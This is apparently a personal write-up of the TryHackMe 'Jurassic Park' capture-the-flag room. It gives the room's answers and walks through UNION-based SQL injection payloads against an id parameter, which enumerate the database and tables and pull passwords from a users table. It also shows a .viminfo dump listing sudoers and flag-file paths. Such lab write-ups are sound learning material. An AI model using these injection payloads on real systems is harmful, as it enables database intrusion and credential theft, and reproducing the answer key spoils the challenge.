<h1>Jurrasic Park</h1>
<h3>219-day-streak</h3>

<br>

![image](https://github.com/user-attachments/assets/b717ffa4-cb1c-4daa-8ad7-b1223facc961)

<br>

![image](https://github.com/user-attachments/assets/59e91b57-b389-42a5-be27-c74ce6b0cdf4)

<br>

<h2>Task 1. Jurassic Park CTF</h2>

![image](https://github.com/user-attachments/assets/1a9cd97d-0cc1-4b51-95a1-9504c9a86493)

<br>

<p>This medium-hard task will require you to enumerate the web application, get credentials to the server and find four flags hidden around the file system. Oh, Dennis Nedry has helped us to secure the app too.<br>

You'll also want to turn up your device's volume (firefox is recommended). So, deploy the VM and get hacking.<br>

Please connect to our network before deploying the machine.</p>

<br>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>What is the name of the SQL database serving the shop information?</em><br><a id='1.1'></a>
>> <code><strong>park</strong></code>

<br>

> 1.2. <em>How many columns does the table have?</em><br><a id='1.2'></a>
>> <code><strong>5</strong></code>

<br>

> 1.3. <em>What is the system version?</em><br><a id='1.3'></a>
>> <code><strong>5</strong></code>

<br>

![image](https://github.com/user-attachments/assets/cb6a330a-2a15-4fea-843b-d97535e0037e)

<br>

![image](https://github.com/user-attachments/assets/a8d4c1a8-7956-4507-8048-12cf4b9b47a9)


<br>

![image](https://github.com/user-attachments/assets/81ccef22-78fa-42f1-b504-e3e99f79a0aa)

<br>

![image](https://github.com/user-attachments/assets/1764a424-d928-4aad-9384-6dd91769012e)


<br>

<p>We have here an</p>

![image](https://github.com/user-attachments/assets/e334d7ce-26a2-4eca-9141-f1ea031600e7)

<br>

![image](https://github.com/user-attachments/assets/246732de-e61c-4e51-aabd-65f365846c04)

<br>

![image](https://github.com/user-attachments/assets/b8a10fb8-91be-4198-8a89-b0d294cec868)

<br>

<p>Dennis is mentinoned in <code>?id=5</code>.  Maybe it is a username?!</p>

<br>

![image](https://github.com/user-attachments/assets/8c346ec3-ce19-484a-9635-ee398e48dc4f)

<br>

<p>Let´s try <code>’ or 1=1</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/0817fa73-100f-477a-a75b-39894433fb0f)

<br>

<p>Scrolling down ... </p>

<br>


![image](https://github.com/user-attachments/assets/a5cd1bf1-d168-46ca-afdb-6a515b64988f)

<br>

<p>So it is about <code>SQL Injection</code>!</p>

<br>

![image](https://github.com/user-attachments/assets/68828109-5c37-4ac9-86ea-12affc334438)


<br>

<p><code>' or 1=1 order by 1,2</code> did not work.<br>
<code>' or 1=1 order by 1,2,3</code> did not work.<br>
<code>' or 1=1 order by 1,2,3,4</code> did not work.<br>
<code>' or 1=1 order by 1,2,3,4,5</code> did not work.<br><br>
But guess what?  .... with <code>' or 1=1 ORDER BY 1,2,3,4,5,6</code> the output wass ...</p>

<br>


![image](https://github.com/user-attachments/assets/62412608-4a88-4c2e-8efd-37ef9247a743)

<br>

<p>So we can conclude that there are <code>5</code> columns!  Leté try <code>UNION</code></p>

<br>

![image](https://github.com/user-attachments/assets/097118f6-9e37-45be-bca5-f53034b80bd6)

<br>

<pre><code>?id=5%20union%20select%201,database(),3,version(),5</code></pre>

![image](https://github.com/user-attachments/assets/ebff2b2c-1b99-4610-9e0d-c7e0140d81fc)

<br>

<p>Now we now the version!</p>



<p>Buy, Buy, Buy</p>

<br>

![image](https://github.com/user-attachments/assets/d3bfe821-a1a6-49f8-a417-88908768be4b)


<br>

![image](https://github.com/user-attachments/assets/a9df154f-133b-4596-b60d-222bd010ad61)

<br>

<pre><code>?id=5%20union%20select%201,group_concat(table_name),3,4,5%20from%20information_schema.tables</code></pre>

<br>

![image](https://github.com/user-attachments/assets/a8f44e9b-199a-4fd7-a26b-80c9d14451bf)

<br>

<pre><code>?id=5 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema = database()</code></pre>

<br>

![image](https://github.com/user-attachments/assets/3d5d88a9-c949-4c3c-806d-5c51db1e747d)

<p>Let´s have some fun ...</p>


<pre><code>?id=5 union select 1,group_concat(table_name),2000000,1000,199 from information_schema.tables where table_schema = database()</code></pre>

<br>

![image](https://github.com/user-attachments/assets/46ca00f2-7542-48f6-9919-296ee6db8379)

<p>We can notice that there are <code>two tables</code>: <code>items</code> and <code>users</code></p>

<br>

<pre><code>?id=5 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema = database() and table_name = "users"</code></pre>

<br>

![image](https://github.com/user-attachments/assets/4b3ca1be-e473-411d-8189-c2ea2d22111c)

<br>

<pre><code>?id=5%20union%20select%201,password,3,4,5%20from%20users</code></pre>

<br>

![image](https://github.com/user-attachments/assets/669a0148-a62f-48b6-a26d-84550fdcba17)

<br>
<br>
<br>


<br>

![image](https://github.com/user-attachments/assets/e7667ec7-a0c5-46c4-9856-dd9f70352bd4)

<br>


![image](https://github.com/user-attachments/assets/82dd10a7-e756-45a5-ac9f-342fadde1b3e)

<br>

![image](https://github.com/user-attachments/assets/a00f90b9-e7d3-46ca-b5b7-62db9bb18fc0)

<br>

<pre><code>dennis@[Target]:~$ cat .viminfo
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Search Pattern:
~MSle0~/root

# Command Line History (newest to oldest):
:x
:x!

# Search String History (newest to oldest):
?/root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  52  25  /etc/ssh/sshd_config
'1  21  38  /etc/sudoers
'2  28  0  /etc/sudoers
'3  1  31  /boot/grub/fonts/flagTwo.txt
'4  144  33  /var/www/html/item.php

# Jumplist (newest first):
-'  52  25  /etc/ssh/sshd_config
-'  1  0  /etc/ssh/sshd_config
-'  21  38  /etc/sudoers
-'  1  0  /etc/sudoers
-'  28  0  /etc/sudoers
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  27  0  /etc/sudoers
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  21  38  /etc/sudoers
-'  1  0  /etc/sudoers
-'  28  0  /etc/sudoers
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  27  0  /etc/sudoers
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php
-'  144  33  /var/www/html/item.php
-'  18  0  /var/www/html/item.php
-'  1  0  /var/www/html/item.php

# History of marks within files (newest to oldest):

> /etc/ssh/sshd_config
	"	52	25
	^	52	26
	.	52	25
	+	52	25

> /etc/sudoers
	"	21	38
	^	21	39
	.	21	27
	+	21	27

> /boot/grub/fonts/flagTwo.txt
	"	1	31
	^	1	32
	.	1	31
	+	1	31

> /var/www/html/item.php
	"	144	33
	^	144	34
	.	144	15
	+	144	15
dennis@ip-10-10-215-56:~$ 
</code></pre>


<br>

![image](https://github.com/user-attachments/assets/aa911ceb-52cf-498b-9628-a85c637c4d68)


<br>


![image](https://github.com/user-attachments/assets/5044d057-f05b-4d50-a87a-ebef6b452b37)

<br>


![image](https://github.com/user-attachments/assets/f0e9dd99-d447-4584-a839-46b3f4c44869)

<br>

![image](https://github.com/user-attachments/assets/cb110942-750b-44f7-bf5c-c310e85c0140)

<br>

![image](https://github.com/user-attachments/assets/64d497ac-7529-44bc-82e7-1f3d62a6ac16)

<br>

![image](https://github.com/user-attachments/assets/034d65da-6d2f-4617-af8d-b7ead1f4070d)

<br>

![image](https://github.com/user-attachments/assets/c1a61a07-6074-41c1-9b5c-78025bc16fed)


<br>
<br>
<br>

<h2>Room Completed<a id='8'></a></h2>
<p>Keep learning, keep growing!<br>


<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/cfd2349e-8600-40cf-b804-a8332245dc62"> </p>

<br>

<p align="center"> <img width="800px" src="https://github.com/user-attachments/assets/79bd2ed0-353d-45f9-b603-9154e0609546"> </p>



<h2>My Journey<a id='3'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| December 11, 2024 | 219      |       940 th |        19 th |      424 th |       4 th |  61,324  |       468 |

</div>

<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/302fdc31-50f6-4cd4-ae45-46f79d8964d8"> </h3>

<br>

<h3 align="center"> <img width="900px" src="https://github.com/user-attachments/assets/5bf83dd6-bac9-4aab-ace2-cb31a8a3253d"> </h3>
